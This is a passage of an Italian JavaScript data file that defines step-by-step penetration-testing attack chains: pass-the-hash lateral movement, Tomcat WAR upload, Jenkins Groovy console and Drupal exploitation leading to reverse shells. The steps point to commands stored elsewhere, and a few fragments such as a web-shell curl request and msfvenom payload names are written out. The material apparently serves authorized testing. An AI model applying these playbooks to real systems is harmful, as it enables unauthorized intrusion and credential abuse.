        "verify": "La share risulta montabile dal target. È la via da preferire quando HTTP in uscita è bloccato ma SMB interno è consentito."
      },
      {
        "id": "s6",
        "title": "Ricerca del loot sull'host",
        "cmdRef": "pillage-files",
        "variant": "default",
        "verify": "L'elenco dei file trovati va filtrato prima di scaricare, per non esfiltrare dati fuori scope."
      },
      {
        "id": "s7",
        "title": "Ricerca nelle share di dominio",
        "cmdRef": "manspider",
        "variant": "default",
        "verify": "Ogni risultato riporta share, percorso e contesto del match, così da valutare la rilevanza prima del download."
      }
    ]
  },
  {
    "id": "pth-lateral",
    "name": "Pass-the-Hash → Movimento laterale",
    "short": "pth",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Muoversi fra host usando l'hash NT senza mai conoscere la password. NTLM accetta l'hash come prova di identità, quindi l'hash estratto da un host vale su tutti quelli che condividono lo stesso account amministratore locale, situazione ancora molto diffusa.",
    "outcome": "Shell su host aggiuntivi senza conoscere alcuna password",
    "prereqs": [
      "Un hash NT valido, tipicamente estratto da SAM o LSASS",
      "SMB o WinRM raggiungibili verso i target",
      "NTLM non disabilitato sul dominio, altrimenti serve Pass-the-Ticket"
    ],
    "mitre": [
      "T1550.002",
      "T1021.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Estrazione degli hash locali",
        "cmdRef": "secretsdump",
        "variant": "local",
        "verify": "Compare la riga `Administrator:500:` con l'hash NT. La parte LM è di norma vuota sui sistemi moderni e non serve."
      },
      {
        "id": "s2",
        "title": "Verifica dell'hash su tutta la subnet",
        "cmdRef": "nxc-pth",
        "variant": "default",
        "verify": "Un `(Pwn3d!)` indica che l'hash concede privilegi amministrativi su quell'host."
      },
      {
        "id": "s3",
        "title": "Account locale invece che di dominio",
        "cmdRef": "nxc-pth",
        "variant": "local",
        "verify": "`--local-auth` è necessario per gli account locali: senza, l'autenticazione viene tentata contro il dominio e fallisce."
      },
      {
        "id": "s4",
        "title": "Shell con PsExec",
        "cmdRef": "psexec",
        "variant": "hash",
        "verify": "Si ottiene SYSTEM ma il metodo crea un servizio sul target, quindi è il più rumoroso e il più registrato dagli EDR."
      },
      {
        "id": "s5",
        "title": "Alternativa più discreta con WMI",
        "cmdRef": "wmiexec",
        "variant": "hash",
        "verify": "Non crea servizi né scrive file, al prezzo di una shell semi-interattiva che esegue un comando per volta."
      },
      {
        "id": "s6",
        "title": "WinRM quando disponibile",
        "cmdRef": "nxc-pth",
        "variant": "winrm",
        "verify": "Richiede l'appartenenza a Remote Management Users ed è generalmente meno sorvegliato di SMB."
      }
    ]
  },
  {
    "id": "tomcat-rce",
    "name": "Tomcat Manager → WAR → RCE",
    "short": "tomcat",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Da un Tomcat esposto a esecuzione di comandi sul server. La leva è il Manager: con credenziali deboli o di default si carica un WAR contenente una JSP shell, che Tomcat esegue con i privilegi del proprio processo. È un foothold classico verso la rete interna, perché Tomcat gira spesso su host applicativi.",
    "outcome": "Shell come utente del servizio Tomcat",
    "prereqs": [
      "Un'istanza Tomcat raggiungibile, tipicamente su 8080 o 8180",
      "Accesso al Manager, che richiede credenziali valide",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Fingerprint di versione",
        "cmdRef": "whatweb",
        "verify": "L'header HTTP Server o la pagina /docs rivelano la versione, per esempio `Apache Tomcat 9.0.30`. Una versione con CVE nota può rendere superfluo il resto."
      },
      {
        "id": "s2",
        "title": "Trova il Manager",
        "cmdRef": "ffuf-dir",
        "variant": "default",
        "verify": "Compaiono `/manager` e `/host-manager`, tipicamente con codice 302 verso la pagina di login."
      },
      {
        "id": "s3",
        "title": "Prova le credenziali di default",
        "cmdRef": "web-default-creds",
        "verify": "Un codice 200 sul Manager con `tomcat:tomcat` o `admin:admin` conferma l'accesso senza bruteforce."
      },
      {
        "id": "s4",
        "title": "Bruteforce del Manager se i default falliscono",
        "cmdRef": "tomcat-manager",
        "variant": "msf",
        "verify": "`Login Successful: tomcat:admin` oppure un'altra coppia valida. `STOP_ON_SUCCESS` ferma al primo esito utile."
      },
      {
        "id": "s5",
        "title": "Genera il payload WAR",
        "cmdRef": "msfvenom",
        "variant": "war",
        "verify": "Il file `shell.war` viene creato; `java/jsp_shell_reverse_tcp` è il payload corretto per il container Java."
      },
      {
        "id": "s6",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in attesa sulla porta scelta come LPORT."
      },
      {
        "id": "s7",
        "title": "Deploy del WAR ed esecuzione",
        "cmdRef": "tomcat-manager",
        "variant": "deploy",
        "verify": "Il deploy risponde `OK - Deployed application`, e la richiesta a `/shell/` fa arrivare la connessione sul listener."
      },
      {
        "id": "s8",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor interattivi. `id` mostra l'utente del servizio Tomcat."
      }
    ]
  },
  {
    "id": "jenkins-rce",
    "name": "Jenkins Script Console → RCE",
    "short": "jenkins",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "15 min",
    "objective": "Da un'istanza Jenkins esposta all'esecuzione di comandi sul server. La leva è la Script Console, che interpreta Groovy con i privilegi del processo: credenziali di default, accesso anonimo o un account admin bastano per raggiungerla. Un comando Groovy conferma la RCE, poi una reverse shell consolida il foothold, spesso già come SYSTEM o root.",
    "outcome": "Esecuzione comandi come utente del processo Jenkins, spesso SYSTEM o root",
    "prereqs": [
      "Un'istanza Jenkins raggiungibile, tipicamente su 8080",
      "Accesso alla dashboard tramite credenziali di default, account admin o istanza senza autenticazione",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Fingerprint di Jenkins",
        "cmdRef": "whatweb",
        "verify": "L'header `X-Jenkins` o la pagina `/configureSecurity/` rivelano Jenkins e la versione."
      },
      {
        "id": "s2",
        "title": "Accesso alla dashboard",
        "cmdRef": "web-default-creds",
        "verify": "La dashboard risponde 200 con `admin:admin` o senza login. L'assenza di redirect a `/login` indica accesso anonimo."
      },
      {
        "id": "s3",
        "title": "Conferma della RCE via Groovy",
        "cmdRef": "jenkins-script",
        "variant": "default",
        "verify": "L'output di `id` o `whoami` compare nella console, per esempio `nt authority\\system` o `uid=...(jenkins)`."
      },
      {
        "id": "s4",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in ascolto sulla porta scelta come LPORT."
      },
      {
        "id": "s5",
        "title": "Reverse shell da Groovy",
        "cmdRef": "jenkins-script",
        "variant": "linux",
        "verify": "La connessione arriva sul listener. Su host Windows va usata la variante ProcessBuilder al posto di quella `/dev/tcp`."
      },
      {
        "id": "s6",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor. `whoami` conferma l'utente del processo Jenkins."
      }
    ]
  },
  {
    "id": "drupal-rce",
    "name": "Drupal → PHP filter / Drupalgeddon → RCE",
    "short": "drupal",
    "category": "service-enum",
    "subcategory": "web-apps",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "25 min",
    "objective": "Da un CMS Drupal a esecuzione di comandi. Prima si conferma la piattaforma e se ne ricava la versione, che decide la strada: sui core datati Drupalgeddon2 dà RCE senza credenziali, altrimenti con accesso amministrativo il modulo PHP filter pubblica una pagina che esegue PHP. Il web shell viene poi convertito in reverse shell stabile come www-data.",
    "outcome": "Shell come utente del web server, tipicamente www-data",
    "prereqs": [
      "Un'istanza Drupal raggiungibile via HTTP",
      "Per la via autenticata, accesso amministrativo al pannello",
      "Connettività in uscita dal target verso la macchina attaccante"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Footprint di Drupal",
        "cmdRef": "whatweb",
        "verify": "Il meta `Generator` con `Drupal 8`, la stringa `Powered by Drupal` o le URI del tipo `/node/1` confermano la piattaforma."
      },
      {
        "id": "s2",
        "title": "Versione e moduli",
        "cmdRef": "droopescan",
        "variant": "default",
        "verify": "`Possible version(s): 8.9.1` e i moduli installati, per esempio `.../modules/php/`. Una versione vecchia orienta su Drupalgeddon."
      },
      {
        "id": "s3",
        "title": "Scorciatoia pre-auth se la versione è vulnerabile",
        "cmdRef": "drupal-rce",
        "variant": "drupalgeddon2",
        "verify": "Su core < 7.58 o < 8.5.1 arriva una sessione Meterpreter. `id` mostra `uid=33(www-data)`."
      },
      {
        "id": "s4",
        "title": "Accesso admin per la via autenticata",
        "cmdRef": "web-default-creds",
        "verify": "Il pannello `/user/login` accetta le credenziali e `/admin` è raggiungibile."
      },
      {
        "id": "s5",
        "title": "Web shell via PHP filter",
        "cmdRef": "drupal-rce",
        "variant": "default",
        "verify": "`curl .../node/<node>?<hash>=id` restituisce `uid=33(www-data)`. La Basic page va salvata con Text format `PHP code`."
      },
      {
        "id": "s6",
        "title": "Listener in ascolto",
        "cmdRef": "nc-listen",
        "variant": "default",
        "verify": "Il listener resta in ascolto sulla porta scelta come LPORT."
      },
      {
        "id": "s7",
        "title": "Reverse shell dal web shell",
        "cmdRef": "revshell",
        "variant": "default",
        "verify": "Il one-liner bash, url-encoded nel parametro della web shell, fa arrivare la connessione sul listener."
      },
      {
        "id": "s8",
        "title": "Stabilizzazione della shell",
        "cmdRef": "shell-pty",
        "variant": "full",
        "verify": "La sessione regge Ctrl+C e gli editor. `id` conferma www-data."
      }
    ]
  }
];
window.CHAINS = CHAINS;
